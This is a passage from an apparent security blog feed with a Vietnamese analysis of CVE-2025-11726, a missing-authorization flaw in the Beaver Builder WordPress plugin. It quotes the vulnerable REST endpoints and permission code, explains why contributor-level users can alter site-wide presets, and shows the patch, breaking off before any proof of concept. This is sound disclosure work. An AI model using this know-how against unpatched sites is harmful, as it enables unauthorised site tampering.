id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/post-smtp/vulnerability/wordpress-post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-plugin-3-6-1-missing-authorization-to-authenticated-subscriber-oauth-token-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post SMTP Plugin &amp;lt;= 3.6.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11726 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-07-cve-2025-11726/</link>
      <pubDate>Sun, 07 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-07-cve-2025-11726/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Beaver Builder ‚Äì WordPress Page Builder&lt;/strong&gt; cho WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Missing Authorization&lt;/strong&gt; (thi·∫øu ph√¢n quy·ªÅn) trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;2.9.4&lt;/strong&gt;. Nguy√™n nh√¢n l√† do &lt;strong&gt;capability checks&lt;/strong&gt; kh√¥ng ƒë·∫ßy ƒë·ªß trong c√°c &lt;strong&gt;REST API endpoints&lt;/strong&gt; thu·ªôc namespace &lt;strong&gt;&lt;code&gt;fl-controls/v1&lt;/code&gt;&lt;/strong&gt;, n∆°i ki·ªÉm so√°t c√°c &lt;strong&gt;Global Presets&lt;/strong&gt; tr√™n to√†n b·ªô website. ƒêi·ªÅu n√†y cho ph√©p c√°c &lt;strong&gt;authenticated attackers&lt;/strong&gt; c√≥ quy·ªÅn t·ª´ m·ª©c &lt;strong&gt;contributor&lt;/strong&gt; tr·ªü l√™n c√≥ th·ªÉ &lt;strong&gt;add, modify ho·∫∑c delete&lt;/strong&gt; c√°c &lt;strong&gt;global color presets&lt;/strong&gt; v√† &lt;strong&gt;background presets&lt;/strong&gt;, t·ª´ ƒë√≥ ·∫£nh h∆∞·ªüng ƒë·∫øn to√†n b·ªô n·ªôi dung s·ª≠ d·ª•ng &lt;strong&gt;Beaver Builder&lt;/strong&gt; tr√™n to√†n site.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11726&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11726&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.4.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/beaver-builder-lite-version/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Beaver Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Beaver Builder&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4.1&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v2.9.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function register_rest_endpoints() {&#xA;    ...&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/color_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::set_color_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/color_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::DELETABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::delete_color_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/background_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::set_background_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt &lt;strong&gt;REST API endpoints&lt;/strong&gt; thu·ªôc namespace &lt;strong&gt;&lt;code&gt;fl-controls/v1&lt;/code&gt;&lt;/strong&gt;, c√≥ th·ªÉ &lt;strong&gt;add, modify ho·∫∑c delete&lt;/strong&gt; c√°c &lt;strong&gt;global color presets&lt;/strong&gt; v√† &lt;strong&gt;background presets&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;C√°c API n√†y ki·ªÉm so√°t truy c·∫≠p th√¥ng qua callback &lt;code&gt;check_permission&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function check_permission() {&#xA;    return FLBuilderUserAccess::current_user_can( &amp;#39;builder_access&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin ƒë√£ custom m·ªôt h√†m &lt;code&gt;current_user_can&lt;/code&gt; ri√™ng v√† s·ª≠ d·ª•ng ki·ªÉm tra quy·ªÅn &lt;code&gt;builder_access&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function register_default_settings() {&#xA;    self::register_setting( &amp;#39;builder_access&amp;#39;, array(&#xA;        &amp;#39;default&amp;#39;     =&amp;gt; &amp;#39;all&amp;#39;,&#xA;        &amp;#39;group&amp;#39;       =&amp;gt; __( &amp;#39;Frontend&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;label&amp;#39;       =&amp;gt; __( &amp;#39;Builder Access&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;The selected roles will have access to the builder for editing posts, pages, and CPTs.&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;order&amp;#39;       =&amp;gt; &amp;#39;1&amp;#39;,&#xA;    ) );&#xA;&#xA;    self::register_setting( &amp;#39;unrestricted_editing&amp;#39;, array(&#xA;        &amp;#39;default&amp;#39;     =&amp;gt; &amp;#39;all&amp;#39;,&#xA;        &amp;#39;group&amp;#39;       =&amp;gt; __( &amp;#39;Frontend&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;label&amp;#39;       =&amp;gt; __( &amp;#39;Unrestricted Editing&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;The selected roles will have unrestricted access to all editing features within the builder.&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;order&amp;#39;       =&amp;gt; &amp;#39;2&amp;#39;,&#xA;    ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;builder_access&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω th√¥ng qua h√†m &lt;code&gt;register_setting&lt;/code&gt; v·ªõi &lt;code&gt;&#39;default&#39; =&amp;gt; &#39;all&#39;&lt;/code&gt; t·ª©c l√† d√†nh cho t·∫•t c·∫£ c√°c user.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;C√¢u h·ªèi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;builder_access&lt;/code&gt;: D√†nh cho t·∫•t c·∫£ c√°c user th√¨ t·∫°i sao l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi ƒë·∫∑c quy·ªÅn Contributor?&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;C√¢u tr·∫£ l·ªùi n·∫±m trong logic c·ªßa h√†m &lt;code&gt;current_user_can&lt;/code&gt; c·ªßa plugin:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function current_user_can( $key ) {&#xA;    $user     = wp_get_current_user();&#xA;    $settings = self::get_saved_settings();&#xA;&#xA;    // Return false if no settings saved.&#xA;    if ( ! isset( $settings[ $key ] ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Make sure super admins have administrator access.&#xA;    if ( is_multisite() &amp;amp;&amp;amp; is_super_admin() &amp;amp;&amp;amp; ! in_array( &amp;#39;administrator&amp;#39;, $user-&amp;gt;roles ) ) {&#xA;        $user-&amp;gt;roles[] = &amp;#39;administrator&amp;#39;;&#xA;    }&#xA;&#xA;    // Check the user&amp;#39;s roles against the saved settings.&#xA;    foreach ( $user-&amp;gt;roles as $role ) {&#xA;&#xA;        // Return true if the user has access.&#xA;        if ( isset( $settings[ $key ][ $role ] ) &amp;amp;&amp;amp; $settings[ $key ][ $role ] ) {&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;current_user_can&lt;/code&gt; ki·ªÉm tra quy·ªÅn d·ª±a tr√™n &lt;strong&gt;role + plugin settings&lt;/strong&gt;, kh√¥ng d·ª±a tr√™n capability chu·∫©n c·ªßa WordPress. H√†m s·∫Ω g·ªçi ƒë·∫øn &lt;code&gt; self::get_saved_settings()&lt;/code&gt; ƒë·ªÉ l·∫•y c√°c setting:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function get_saved_settings() {&#xA;    if ( self::$settings ) {&#xA;        return self::$settings;&#xA;    }&#xA;&#xA;    $roles       = self::get_all_roles();&#xA;    $settings    = FLBuilderModel::get_admin_settings_option( &amp;#39;_fl_builder_user_access&amp;#39;, true );&#xA;    $ms_settings = FLBuilderModel::get_admin_settings_option( &amp;#39;_fl_builder_user_access&amp;#39;, false );&#xA;    $ms_support  = FLBuilderAdminSettings::multisite_support();&#xA;&#xA;    if ( ! is_array( $settings ) ) {&#xA;        $settings = array();&#xA;    }&#xA;&#xA;    foreach ( self::$registered_settings as $key =&amp;gt; $data ) {&#xA;&#xA;        if ( ! isset( $settings[ $key ] ) ) {&#xA;            if ( $ms_support &amp;amp;&amp;amp; isset( $ms_settings[ $key ] ) ) {&#xA;                $settings[ $key ] = $ms_settings[ $key ];&#xA;            } else {&#xA;                $settings[ $key ] = array();&#xA;            }&#xA;        }&#xA;&#xA;        foreach ( $roles as $role_key =&amp;gt; $role_data ) {&#xA;&#xA;            if ( ! isset( $settings[ $key ][ $role_key ] ) ) {&#xA;&#xA;                if ( ! isset( $data[&amp;#39;default&amp;#39;] ) || ! $data[&amp;#39;default&amp;#39;] ) {&#xA;                    $settings[ $key ][ $role_key ] = false;&#xA;                } elseif ( is_array( $data[&amp;#39;default&amp;#39;] ) ) {&#xA;&#xA;                    if ( in_array( $role_key, $data[&amp;#39;default&amp;#39;] ) ) {&#xA;                        $settings[ $key ][ $role_key ] = true;&#xA;                    } else {&#xA;                        $settings[ $key ][ $role_key ] = false;&#xA;                    }&#xA;                } else {&#xA;                    $settings[ $key ][ $role_key ] = true;&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    self::$settings = $settings;&#xA;&#xA;    return $settings;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;get_saved_settings&lt;/code&gt; c√≥ nhi·ªám v·ª• l·∫•y v√† chu·∫©n ho√° c·∫•u h√¨nh ph√¢n quy·ªÅn theo role t·ª´ option &lt;code&gt;_fl_builder_user_access&lt;/code&gt;, √°p d·ª•ng gi√° tr·ªã m·∫∑c ƒë·ªãnh (&lt;code&gt;default&lt;/code&gt;) cho t·ª´ng &lt;code&gt;$key&lt;/code&gt; v√† t·ª´ng &lt;code&gt;role&lt;/code&gt;, r·ªìi cache v√†o &lt;code&gt;self::$settings&lt;/code&gt;. Roles ƒë∆∞·ª£c l·∫•y th√¥ng qua vi·ªác g·ªçi h√†m &lt;code&gt;self::get_all_roles()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function get_all_roles() {&#xA;    if ( ! function_exists( &amp;#39;get_editable_roles&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;wp-admin/includes/user.php&amp;#39;;&#xA;    }&#xA;&#xA;    $editable_roles = get_editable_roles();&#xA;    $roles          = array();&#xA;    $caps           = apply_filters( &amp;#39;fl_builder_user_access_capabilities&amp;#39;, array( &amp;#39;edit_posts&amp;#39; ) );&#xA;&#xA;    foreach ( $editable_roles as $role =&amp;gt; $data ) {&#xA;        foreach ( $caps as $cap ) {&#xA;            if ( isset( $data[&amp;#39;capabilities&amp;#39;][ $cap ] ) &amp;amp;&amp;amp; 1 == $data[&amp;#39;capabilities&amp;#39;][ $cap ] ) {&#xA;                $roles[ $role ] = $data[&amp;#39;name&amp;#39;];&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    return $roles;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;get_all_roles()&lt;/code&gt; tr·∫£ v·ªÅ danh s√°ch c√°c &lt;strong&gt;role c√≥ capability nh·∫•t ƒë·ªãnh&lt;/strong&gt;, m·∫∑c ƒë·ªãnh l√† &lt;code&gt;edit_posts&lt;/code&gt; ‚Äî t·ª©c l√† th·ª±c t·∫ø bao g·ªìm c√°c role t·ª´ &lt;strong&gt;Contributor tr·ªü l√™n&lt;/strong&gt;. &lt;mark class=&#34;mark-default&#34;&gt;ƒê√¢y ch√≠nh l√† c√¢u tr·∫£ l·ªùi&lt;/mark&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v2.9.4.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thay &lt;code&gt;check_permission&lt;/code&gt; b·∫±ng &lt;code&gt;check_write_permission&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff1.png&#34; title=&#34;S·ª≠ d·ª•ng check_write_permission thay cho check_permission&#34; data-thumbnail=&#34;/posts/2025-12-07-cve-2025-11726/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff1&lt;/h2&gt;&lt;p&gt;S·ª≠ d·ª•ng check_write_permission thay cho check_permission&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff1.png&#39; alt=&#34;Diff1&#34; height=&#34;625&#34; width=&#34;1832&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª≠ d·ª•ng check_write_permission thay cho check_permission&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Y√™u c·∫ßu ƒë·ªìng th·ªùi hai quy·ªÅn n·ªôi b·ªô c·ªßa plugin: &lt;code&gt;unrestricted_editing&lt;/code&gt; v√† &lt;code&gt;builder_access&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function check_write_permission() {&#xA;    return ( FLBuilderUserAccess::current_user_can( &amp;#39;unrestricted_editing&amp;#39; ) &amp;amp;&amp;amp; FLBuilderUserAccess::current_user_can( &amp;#39;builder_access&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hai quy·ªÅn n√†y ƒë∆∞·ª£c s·ª≠a l·∫°i, ch·ªâ d√†nh cho &lt;code&gt;administrator&lt;/code&gt; v√† &lt;code&gt;editor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff2.png&#34; title=&#34;Thay ƒë·ªïi quy·ªÅn&#34; data-thumbnail=&#34;/posts/2025-12-07-cve-2025-11726/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff2&lt;/h2&gt;&lt;p&gt;Thay ƒë·ªïi quy·ªÅn&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff2.png&#39; alt=&#34;Diff2&#34; height=&#34;341&#34; width=&#34;1748&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thay ƒë·ªïi quy·ªÅn&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;strong&gt;C√°c callback t∆∞∆°ng ·ª©ng v·ªõi c√°c endpoint:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function set_color_presets( $request ) {&#xA;    $color_presets = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params        = $request-&amp;gt;get_params();&#xA;&#xA;    if ( isset( $params[&amp;#39;clearPresets&amp;#39;] ) &amp;amp;&amp;amp; true === $params[&amp;#39;clearPresets&amp;#39;] ) {&#xA;        if ( update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] ) ) {&#xA;            return new WP_REST_Response( [&#xA;                &amp;#39;presets&amp;#39; =&amp;gt; [],&#xA;            ], 200 );&#xA;        }&#xA;    }&#xA;&#xA;    // Dedupe the merged arrays&#xA;    $new_presets = array_unique( array_merge( $color_presets, $params[&amp;#39;addPresets&amp;#39;] ) );&#xA;&#xA;    update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, $new_presets );&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $new_presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;static public function delete_color_presets( $request ) {&#xA;    $color_presets = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params        = $request-&amp;gt;get_params();&#xA;&#xA;    $new_presets = array_values( array_filter( $color_presets, function ( $color ) use ( $params ) {&#xA;&#xA;        // Check for exact match and value w/ # prepended&#xA;        return ! in_array( $color, $params[&amp;#39;deletePresets&amp;#39;] ) &amp;amp;&amp;amp; ! in_array( &amp;#39;#&amp;#39; . $color, $params[&amp;#39;deletePresets&amp;#39;] );&#xA;    } ) );&#xA;&#xA;    if ( update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, $new_presets ) ) {&#xA;        $color_presets = $new_presets;&#xA;    }&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $color_presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;static public function set_background_presets( $request ) {&#xA;    $presets     = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params      = $request-&amp;gt;get_params();&#xA;    $new_presets = array_merge( $presets, $params[&amp;#39;addPresets&amp;#39;] );&#xA;&#xA;    if ( update_option( &amp;#39;_fl_builder_background_presets&amp;#39;, $new_presets ) ) {&#xA;        $presets = $new_presets;&#xA;    }&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 